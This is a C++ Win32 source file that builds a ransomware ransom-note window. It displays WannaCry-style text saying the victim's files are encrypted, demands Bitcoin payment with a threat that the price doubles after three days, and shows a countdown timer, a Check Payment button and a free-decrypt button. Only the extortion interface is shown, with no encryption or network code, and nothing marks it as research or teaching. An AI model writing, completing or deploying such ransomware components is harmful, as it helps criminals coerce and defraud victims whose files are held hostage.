#include "Window.hpp"
#include "DigitalFont.hpp"
#include "bitmaps.hpp"
#include "..\include\include.hpp"
#include <stdexcept>
#include <string.h>
#include <Richedit.h>

#define TEXT_HEADER L"What Happened to My Computer?"
#define TEXT_HEADER2 L"Can I Recover My Files?"
#define TEXT_HEADER3 L"How Do I Pay?"

#define TEXT_PLACEHOLDER L"Your important files are encrypted. Many of your documents, photos, videos, databases and other files are no longer accessible because they have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody can recover your files without our decryption service."
#define TEXT_PLACEHOLDER2 L"Sure. We guarantee that you can recover all your files safely and easily. But you have not so enough time. You can decrypt some of your files for free. Try now by clicking <Decrypt>. But if you want to decrypt all your files, you need to pay. You only have 3 days to submit the payment. After that the price will be doubled."
#define TEXT_PLACEHOLDER3 L"Payment is accepted in Bitcoin only. For more information, click <About bitcoin>. Please check the current price of Bitcoin and buy some bitcoins. For more information, click <How to buy bitcoins>. And send the correct amount to the address specified in this window. After your payment, click <Check Payment> button. We will check your payment and perform decryption. If you need our assistance, click <Support> button."

using namespace gui;
using namespace std::chrono;

static HINSTANCE hInstRichEdit = NULL;

LRESULT CALLBACK gui::Window::WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_CREATE:
    {
        CREATESTRUCT* pCreate = reinterpret_cast<CREATESTRUCT*>(lParam);
        SetWindowLongPtr(hwnd, GWLP_USERDATA, reinterpret_cast<LONG_PTR>(pCreate->lpCreateParams));
        return 0;
    }
    case WM_COMMAND:
    {
        int wmId = LOWORD(wParam);
        int wmEvent = HIWORD(wParam);
        switch (wmId)
        {
        case (UINT)Widget::CHECK_PAYMENT_BUTTON:
        {
            DBG_PRINT("Button: CHECK_PAYMENT_BUTTON");
            
        } break;
        case (UINT)Widget::FREE_DECRYPT_BUTTON:
        {
            DBG_PRINT("Button: FREE_DECRYPT_BUTTON");
            
        } break;
        case (UINT)Widget::LANGUAGE_LIST_BOX:
        {
            if (wmEvent == CBN_SELCHANGE)
            {
                auto& window = Window::getInstance();

                int selectedItemIndex = SendMessage(window.m_widgets[Widget::LANGUAGE_LIST_BOX], CB_GETCURSEL, 0, 0);

                WCHAR selectedLanguage[50];
                SendMessage(window.m_widgets[Widget::LANGUAGE_LIST_BOX], CB_GETLBTEXT, selectedItemIndex, (LPARAM)selectedLanguage);

                DBG_PRINT("Selected language: %ws", selectedLanguage);
            }
        } break;
        }
    }
    case WM_TIMER: 
    {
        switch (wParam) 
        {
        case (UINT)Widget::TIMER:
        {
            //pThis->updateTimer();
            DBG_PRINT("Timer: TIMER");
        } break;
        }
        return 0;
    }

    case WM_CTLCOLORSTATIC: 
    {
        HDC hdcStatic = (HDC)wParam;
        SetTextColor(hdcStatic, RGB(255, 255, 255));
        SetBkMode(hdcStatic, TRANSPARENT);
        return (INT_PTR)GetStockObject(NULL_BRUSH);
    }

    case WM_PAINT:
    {
        /*PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        HDC hdcMem = CreateCompatibleDC(hdc);
        auto& hBitmap = Window::getInstance().m_bitmaps[Bitmap::BITCOIN];

        SelectObject(hdcMem, hBitmap);

        BITMAP bm;
        GetObject(hBitmap, sizeof(bm), &bm);

        BitBlt(hdc, 0, 0, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);

        DeleteDC(hdcMem);
        EndPaint(hwnd, &ps);*/

    } break;

    case WM_CLOSE: DestroyWindow(hwnd); break;

    case WM_DESTROY: PostQuitMessage(0); break;

    default: return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    
    return 0;
}

HFONT gui::Window::createFont(int height, int width, std::vector<BYTE>* fontData)
{
    if (!fontData)
    {
        return CreateFontW(
            height, 0, 0, 0,
            width, FALSE, FALSE, FALSE,
            ANSI_CHARSET, OUT_DEFAULT_PRECIS,
            CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
            DEFAULT_PITCH | FF_DONTCARE, L"Arial");
    }

    DWORD numFonts = NULL;
    HANDLE fontHandle = AddFontMemResourceEx(fontData->data(), static_cast<DWORD>(fontData->size()), NULL, &numFonts);
    if (fontHandle == NULL)
        return nullptr;

    LOGFONT lf = { 0 };
    wcscpy_s(lf.lfFaceName, LF_FACESIZE, L"SFDigitalReadout-Medium");
    lf.lfHeight = height;
    lf.lfWidth = width;
    return CreateFontIndirect(&lf);
}

void gui::Window::updateTimer()
{
    auto remainingTime = duration_cast<seconds>(m_endTime - steady_clock::now());
    auto hwnd = m_widgets[Widget::TIMER];
    if (remainingTime.count() <= 0) 
    {
        KillTimer(hwnd, 1);
        DBG_PRINT("Timer stopped!");
        return;
    }

    int days = duration_cast<std::chrono::days>(remainingTime).count();
    int hours = duration_cast<std::chrono::hours>(remainingTime % std::chrono::days(1)).count();
    int minutes = duration_cast<std::chrono::minutes>(remainingTime % std::chrono::hours(1)).count();
    int seconds = duration_cast<std::chrono::seconds>(remainingTime % std::chrono::minutes(1)).count();

    wchar_t countdownText[100];
    wsprintf(countdownText, L"%02d:%02d:%02d:%02d", days, hours, minutes, seconds);

    SetWindowText(GetDlgItem(hwnd, int(Widget::TIMER)), countdownText);
}

void gui::Window::drawLabel(const std::wstring& text)
{
    HWND hwndLabelMainMessage = CreateWindow(L"STATIC", text.c_str(),
        WS_CHILD | WS_VISIBLE | SS_CENTER,
        200, 10, 510, 30,
        m_window, nullptr, m_windowClass.hInstance, nullptr);
    SendMessage(hwndLabelMainMessage, WM_SETFONT, WPARAM(m_fonts[Fonts::LABEL]), TRUE);
}

void gui::Window::drawRichText()
{
    HWND hwndRichEdit = CreateWindowEx(
        WS_EX_CLIENTEDGE,
        MSFTEDIT_CLASS,
        L"",
        WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY,
        200, 50, 675, 300,
        m_window,
        nullptr,
        m_windowClass.hInstance,
        nullptr);

    SendMessage(hwndRichEdit, WM_SETFONT, WPARAM(m_fonts[Fonts::TEXT_BOX]), TRUE);

    CHARFORMAT2 cf;
    ZeroMemory(&cf, sizeof(cf));
    cf.cbSize = sizeof(cf);
    cf.dwMask = CFM_BOLD | CFM_SIZE | CFM_FACE;
    cf.dwEffects = CFE_BOLD | CFE_ITALIC;
    cf.yHeight = 16 * 20;
    wcscpy_s(cf.szFaceName, L"Arial");

    auto setText = [&](const std::wstring& text, bool header, bool newLine) -> void
    {
        if (header)
        {
            cf.dwEffects = CFE_BOLD | CFE_ITALIC;
            cf.yHeight = 18 * 20;
        }
        else
        {
            cf.dwEffects = CFE_ITALIC;
            cf.yHeight = 14 * 20;
        }

		SendMessage(hwndRichEdit, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf);
		SendMessage(hwndRichEdit, EM_REPLACESEL, FALSE, (LPARAM)text.c_str());
		if (newLine)
			SendMessage(hwndRichEdit, EM_REPLACESEL, FALSE, (LPARAM)L"\r\n");
	};

    setText(TEXT_HEADER, true, true);
    setText(TEXT_PLACEHOLDER, false, true);
    SendMessage(hwndRichEdit, EM_REPLACESEL, FALSE, (LPARAM)L"\r\n");

    setText(TEXT_HEADER2, true, true);
    setText(TEXT_PLACEHOLDER2, false, true);
    SendMessage(hwndRichEdit, EM_REPLACESEL, FALSE, (LPARAM)L"\r\n");

    setText(TEXT_HEADER3, true, true);
    setText(TEXT_PLACEHOLDER3, false, false);
}

void gui::Window::drawListBox()
{
    m_widgets[Widget::LANGUAGE_LIST_BOX] = CreateWindowEx(
        0,
        L"COMBOBOX",
        L"",
        CBS_DROPDOWNLIST | WS_CHILD | WS_VISIBLE | WS_TABSTOP | WS_VSCROLL,
        200 + 450 + 60 + 14, 10, 150, 300,
        m_window,
        (HMENU)Widget::LANGUAGE_LIST_BOX,
        m_windowClass.hInstance,
        nullptr);

    auto& listBoxWnd = m_widgets[Widget::LANGUAGE_LIST_BOX];

    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"English");
    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"Polski");
    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"Español");
    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"Français");
    SendMessage(listBoxWnd, CB_ADDSTRING, 0, (LPARAM)L"Deutsch");

    SendMessage(listBoxWnd, CB_SETCURSEL, (WPARAM)0, 0);
}

void gui::Window::createImages()
{
    auto loadBitmap = [&](std::vector<BYTE>* bitmapData) -> HBITMAP
    {
        BITMAPFILEHEADER* bmfh = reinterpret_cast<BITMAPFILEHEADER*>(bitmapData->data());
        BITMAPINFO* bmi = reinterpret_cast<BITMAPINFO*>(bitmapData->data() + sizeof(BITMAPFILEHEADER));

        BYTE* _bitmapData = bitmapData->data() + bmfh->bfOffBits;
        return CreateDIBSection(NULL, bmi, DIB_RGB_COLORS, (void**)&_bitmapData, NULL, 0);
	};

    m_bitmaps[Bitmap::BITCOIN] = loadBitmap(&bitcoin_map);
}

gui::Window::Window()
{
    try
    {
        createWindow();
    }
    catch (const std::exception& e)
    {
		DBG_PRINT("%s", e.what());
		throw;
	}
    
    ShowWindow(m_window, SW_SHOWDEFAULT);
    UpdateWindow(m_window);
}

gui::Window::~Window()
{
	for (auto& font : m_fonts)
		DeleteObject(font.second);

    for (auto& bitmap : m_bitmaps)
        DeleteObject(bitmap.second);

    //DeleteObject(hLogoImage);
    DeleteObject(m_bgBrush);
	DestroyWindow(m_window);
	UnregisterClass(m_label.c_str(), m_windowClass.hInstance);

    FreeLibrary(hInstRichEdit);
}

void gui::Window::show()
{
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) 
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

void gui::Window::createWindow()
{
    m_endTime = steady_clock::now() + days(7);
    SetTimer(m_window, UINT(Widget::TIMER), 1000, NULL);
    m_bgBrush = CreateSolidBrush(m_bgColor);
    m_windowClass = 
    {
        .cbSize = sizeof(WNDCLASSEX),
        .style = CS_CLASSDC,
        .lpfnWndProc = WindowProc,
        .cbClsExtra = 0L,
        .cbWndExtra = 0L,
        .hInstance = GetModuleHandle(NULL),
        .hIcon = LoadIcon(NULL, IDI_APPLICATION),
        .hCursor = LoadCursor(NULL, IDC_ARROW),
        .hbrBackground = m_bgBrush,
        .lpszMenuName = NULL,
        .lpszClassName = m_label.c_str(),
        .hIconSm = LoadIcon(NULL, IDI_APPLICATION)
    };

    if (!RegisterClassEx(&m_windowClass))
        throw std::runtime_error("Failed to register window class.");

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    if (screenWidth <= 0 || screenHeight <= 0)
        throw std::runtime_error("Invalid screen size.");

    int windowPosX = (screenWidth / 2) - (m_windowSize[0] / 2);
    int windowPosY = (screenHeight / 2) - (m_windowSize[1] / 2);

    DWORD windowStyle = WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU;
    m_window = CreateWindowEx(
        WS_EX_TOPMOST,
        m_windowClass.lpszClassName,
        m_label.c_str(),
        windowStyle, //pos
        windowPosX, windowPosY, //size
        m_windowSize[0], m_windowSize[1],
        NULL, NULL, m_windowClass.hInstance, NULL);

    if (!m_window)
        throw std::runtime_error("Failed to create window.");

    m_fonts[Fonts::TIMER] = createFont(30, 0, &digitalFontData);
    m_fonts[Fonts::LABEL] = createFont(30, FW_EXTRABOLD);
    m_fonts[Fonts::TEXT_BOX] = createFont(20, FW_LIGHT);
    m_fonts[Fonts::BUTTON] = createFont(20, 0);

    createImages();

    for (auto& font : m_fonts)
    {
		if (!font.second)
			throw std::runtime_error("Failed to create font.");
	}

    hInstRichEdit = LoadLibrary(L"Msftedit.dll");
    if (hInstRichEdit == NULL) 
        throw std::runtime_error("Failed to load Msftedit library.");

    drawLabel(L"Ooops, your files have been encrypted!");

    drawRichText();

    drawListBox();

    m_widgets[Widget::FREE_DECRYPT_BUTTON] = CreateWindow(L"BUTTON", L"Decrypt",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        200, 360, 150, 30,
        m_window, (HMENU)Widget::FREE_DECRYPT_BUTTON, m_windowClass.hInstance, nullptr);
    SendMessage(m_widgets[Widget::FREE_DECRYPT_BUTTON], WM_SETFONT, WPARAM(m_fonts[Fonts::TEXT_BOX]), TRUE);

    m_widgets[Widget::CHECK_PAYMENT_BUTTON] = CreateWindow(L"BUTTON", L"Check Payment",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        200 + 150 + 50, 360, 150, 30,
        m_window, (HMENU)Widget::CHECK_PAYMENT_BUTTON, m_windowClass.hInstance, nullptr);
    SendMessage(m_widgets[Widget::CHECK_PAYMENT_BUTTON], WM_SETFONT, WPARAM(m_fonts[Fonts::TEXT_BOX]), TRUE);

    m_widgets[Widget::TIMER] = CreateWindow(L"STATIC", L"99:59:59:59",
        WS_CHILD | WS_VISIBLE | SS_CENTER,
        10, 200, 180, 30,
        m_window, (HMENU)Widget::TIMER, m_windowClass.hInstance, nullptr);
    SendMessage(m_widgets[Widget::TIMER], WM_SETFONT, WPARAM(m_fonts[Fonts::TIMER]), TRUE);

}
